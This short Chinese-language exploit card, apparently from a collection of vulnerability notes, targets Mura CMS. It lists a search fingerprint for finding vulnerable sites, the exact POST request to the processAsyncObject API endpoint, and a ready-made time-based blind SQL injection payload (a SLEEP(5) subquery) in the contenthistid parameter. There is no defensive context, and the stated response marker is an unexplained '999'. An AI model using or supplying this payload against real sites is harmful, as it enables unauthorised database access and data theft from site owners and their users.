# MuraCMS-SQL注入-default

MuraCMS ｜ SQL注入 ｜ —
- **指纹**：`"Mura CMS"`
- **请求**：`POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1`

**Payload**
```
object=displayregion&contenthistid=x%5c'* AND (SELECT 3504 FROM (SELECT(SLEEP(5)))MQYa)-- Arrv&previewid=1
```
- **响应特征**：999